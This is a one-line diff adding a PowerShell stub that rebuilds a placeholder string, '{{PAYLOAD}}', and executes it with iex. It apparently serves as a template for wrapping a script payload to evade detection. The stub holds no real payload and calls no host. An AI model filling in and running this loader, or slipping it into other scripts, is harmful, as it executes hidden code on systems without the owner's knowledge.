@@ -1,0 +1,1 @@
+$a = ''; $b = '{{PAYLOAD}}'.Split(); foreach($c in $b){$a += $c + ' '}; iex $a
